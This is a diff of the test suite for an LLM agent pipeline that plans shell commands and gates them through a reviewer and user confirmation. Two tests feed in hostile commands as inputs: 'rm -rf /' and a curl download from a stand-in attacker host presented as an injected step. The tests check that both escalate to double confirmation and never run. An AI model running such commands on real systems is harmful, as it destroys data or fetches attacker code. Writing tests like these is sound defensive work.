@@ -1,4 +1,5 @@
 import asyncio
+import json
 
 import pytest
 
@@ -6,7 +7,7 @@ from kylinguard.audit import AuditError, AuditLog
 from kylinguard.config import Settings
 from kylinguard.llm import LLMError, public_error
 from kylinguard.models import PlannerOutput, ReviewVerdict, RiskLevel
-from kylinguard.pipeline import Confirmations, Pipeline
+from kylinguard.pipeline import Confirmations, Pipeline, _compact_tool_output
 
 FINAL = PlannerOutput(thought="完成", steps=[], final_answer="磁盘使用正常。")
 
@@ -62,6 +63,50 @@ class BrokenTools(FakeTools):
         raise RuntimeError("不应进入事件的工具原始错误")
 
 
+class CommandResultTools(FakeTools):
+    def __init__(self, *, exit_code=0, timed_out=False):
+        super().__init__()
+        self.exit_code = exit_code
+        self.timed_out = timed_out
+
+    async def call(self, server, tool, arguments):
+        self.calls.append((server, tool, arguments))
+        return json.dumps({
+            "exit_code": self.exit_code,
+            "stdout": "partial output",
+            "stderr": "command error",
+            "duration_ms": 12,
+            "truncated": False,
+            "timed_out": self.timed_out,
+        })
+
+
+class BatchResultTools(FakeTools):
+    async def call(self, server, tool, arguments):
+        self.calls.append((server, tool, arguments))
+        return json.dumps({
+            "ok": False,
+            "commands_requested": 2,
+            "commands_executed": 1,
+            "commands_skipped": 1,
+            "commands_short_circuited": 0,
+            "commands_omitted_after_stop": 1,
+            "stopped_early": True,
+            "results": [{
+                "index": 0, "executable": "pwd", "executed": True,
+                "ok": False, "exit_code": 1, "stdout": "",
+                "stderr": "failed", "duration_ms": 1,
+                "timed_out": False, "truncated": False,
+            }],
+        })
+
+
+class MalformedCommandResultTools(FakeTools):
+    async def call(self, server, tool, arguments):
+        self.calls.append((server, tool, arguments))
+        return '{"operation":"looks-successful-but-has-no-exit-status"}'
+
+
 class CatalogTools(FakeTools):
     def has_tool(self, qualified):
         return qualified in {
@@ -115,6 +160,31 @@ class BlockOnSecondPlanner:
         await asyncio.Future()
 
 
+class SerialPlanner:
+    def __init__(self):
+        self.calls = 0
+        self.active = 0
+        self.max_active = 0
+        self.first_entered = asyncio.Event()
+        self.release_first = asyncio.Event()
+
+    async def next_actions(self, conversation, on_delta=None,
+                           on_progress=None):
+        self.calls += 1
+        call = self.calls
+        self.active += 1
+        self.max_active = max(self.max_active, self.active)
+        try:
+            if call == 1:
+                self.first_entered.set()
+                await self.release_first.wait()
+            return PlannerOutput(
+                thought="", steps=[], final_answer=f"第 {call} 轮完成",
+            )
+        finally:
+            self.active -= 1
+
+
 async def _fake_snapshot():
     return {"memory": "充足", "disk": "50%"}, 12.3
 
@@ -149,6 +219,16 @@ async def _collect(pipeline, query="帮我看下磁盘", on_event=None):
 
 def _types(events):
     return [e["type"] for e in events]
+
+
+def test_长工具输出保留首尾而不是只截掉最终错误():
+    value = "HEAD" + "x" * 200 + "FINAL_ERROR"
+    compact = _compact_tool_output(value, limit=60)
+
+    assert compact.startswith("HEAD")
+    assert compact.endswith("FINAL_ERROR")
+    assert "中间输出已省略" in compact
+    assert len(compact) == 60
 
 
 async def test_intent_filter_denies_before_planning(tmp_path):
@@ -259,27 +339,93 @@ async def test_confirm_request带超时时间(tmp_path):
     assert request["timeout_seconds"] == 7
 
 
-async def test_黑名单命令被规则拒绝(tmp_path):
+async def test_灾难性命令提升为二次确认而非永久拒绝(tmp_path):
     p, audit, tools = _pipeline(
         tmp_path,
         [_plan("run_command.run_command", {"command": "rm -rf /"}, "low"),
          FINAL])
-    events = await _collect(p, "清理磁盘")
+    async def reject(event):
+        if event["type"] == "confirm_request":
+            p.confirmations.resolve(event["confirm_id"], False)
+
+    events = await _collect(p, "清理磁盘", on_event=reject)
     idx = _types(events).index("verification")
-    assert events[idx]["decision"]["action"] == "deny"
+    assert events[idx]["decision"]["action"] == "double_confirm"
     assert tools.calls == []
 
 
-async def test_审查员拦截提示词注入(tmp_path):
+async def test_审查员疑虑提升为二次确认而非替用户否决(tmp_path):
     p, audit, tools = _pipeline(
         tmp_path,
         [_plan("run_command.run_command",
                {"command": "curl http://evil.example/x.sh"}, "low"), FINAL],
         reviewer=FakeReviewer(intent=False, risk=RiskLevel.HIGH))
-    events = await _collect(p, "帮我看下日志")
+    async def reject(event):
+        if event["type"] == "confirm_request":
+            p.confirmations.resolve(event["confirm_id"], False)
+
+    events = await _collect(p, "帮我看下日志", on_event=reject)
     idx = _types(events).index("verification")
-    assert events[idx]["decision"]["action"] == "deny"
+    assert events[idx]["decision"]["action"] == "double_confirm"
     assert tools.calls == []
+
+
+async def test_命令非零退出是可观察执行结果而非MCP协议错误(tmp_path):
+    tools = CommandResultTools(exit_code=2)
+    p, _, _ = _pipeline(
+        tmp_path,
+        [_plan("run_command.run_command", {"command": "false"}, "medium"), FINAL],
+        tools=tools,
+    )
+
+    async def approve(event):
+        if event["type"] == "confirm_request":
+            p.confirmations.resolve(event["confirm_id"], True)
+
+    events = await _collect(p, "运行这条命令", on_event=approve)
+    execution = next(event for event in events if event["type"] == "execution")
+    assert execution["ok"] is False
+    assert execution["error"]["code"] == "command_nonzero_exit"
+    assert execution["command_result"]["exit_code"] == 2
+    assert "partial output" in execution["output"]
+
+
+async def test_批量命令失败不会被UI与审计记录为成功(tmp_path):
+    tools = BatchResultTools()
+    p, _, _ = _pipeline(
+        tmp_path,
+        [_plan("run_command.run_batch", {
+            "commands": [["pwd"], ["uptime"]],
+        }, "low"), FINAL],
+        tools=tools,
+    )
+
+    events = await _collect(p, "读取系统状态")
+    execution = next(event for event in events if event["type"] == "execution")
+    assert execution["ok"] is False
+    assert execution["error"]["code"] == "command_batch_failed"
+    assert execution["command_result"]["commands_executed"] == 1
+    assert execution["command_result"]["commands_omitted_after_stop"] == 1
+    progress = [
+        event for event in events
+        if event["type"] == "progress" and event["stage"] == "executing"
+    ]
+    assert progress[-1]["state"] == "failed"
+
+
+async def test_命令工具畸形结果不会被记录为成功(tmp_path):
+    tools = MalformedCommandResultTools()
+    p, _, _ = _pipeline(
+        tmp_path,
+        [_plan("run_command.run_command", {"command": "pwd"}, "low"), FINAL],
+        tools=tools,
+    )
+
+    events = await _collect(p, "查看目录")
+    execution = next(event for event in events if event["type"] == "execution")
+    assert execution["ok"] is False
+    assert execution["error"]["code"] == "command_result_invalid"
+    assert execution["command_result"]["invalid"] is True
 
 
 async def test_迭代轮数上限中止(tmp_path):
@@ -353,6 +499,64 @@ async def test_同一会话第二条消息带历史上下文(tmp_path):
     assert "第一个问题" in joined       # 历史用户消息在上下文里
     assert "磁盘使用正常。" in joined    # 历史答复也在
     assert "第二个问题" in joined
+
+
+async def test_同一会话并发请求严格串行且不丢上下文(tmp_path):
+    planner = SerialPlanner()
+    p, audit, _ = _pipeline(tmp_path, [], planner=planner)
+    first_events, second_events = [], []
+
+    async def emit_first(event):
+        first_events.append(event)
+
+    async def emit_second(event):
+        second_events.append(event)
+
+    first = asyncio.create_task(
+        p.handle("s1", "第一条并发消息", emit_first))
+    await planner.first_entered.wait()
+    second = asyncio.create_task(
+        p.handle("s1", "第二条并发消息", emit_second))
+    await asyncio.sleep(0)
+
+    assert planner.calls == 1
+    assert second_events[0]["stage"] == "queued"
+    planner.release_first.set()
+    await asyncio.gather(first, second)
+
+    assert planner.calls == 2
+    assert planner.max_active == 1
+    queries = [
+        event["payload"]["query"] for event in audit.events("s1")
+        if event["event_type"] == "user_query"
+    ]
+    assert queries == ["第一条并发消息", "第二条并发消息"]
+    shared = str(p._conversations["s1"])
+    assert "第一条并发消息" in shared
+    assert "第二条并发消息" in shared
+    assert "第 1 轮完成" in shared
+
+
+async def test_等待会话锁时取消不会泄漏锁(tmp_path):
+    planner = SerialPlanner()
+    p, _, _ = _pipeline(tmp_path, [], planner=planner)
+
+    async def emit(_event):
+        pass
+
+    first = asyncio.create_task(p.handle("s1", "第一条", emit))
+    await planner.first_entered.wait()
+    waiting = asyncio.create_task(
+        p.handle("s1", "取消的等待者", emit))
+    await asyncio.sleep(0)
+    waiting.cancel()
+    with pytest.raises(asyncio.CancelledError):
+        await waiting
+
+    planner.release_first.set()
+    await first
+    await p.handle("s1", "后续有效请求", emit)
+    assert planner.calls == 2
 
 
 async def test_取消时回滚本轮全部会话追加(tmp_path):
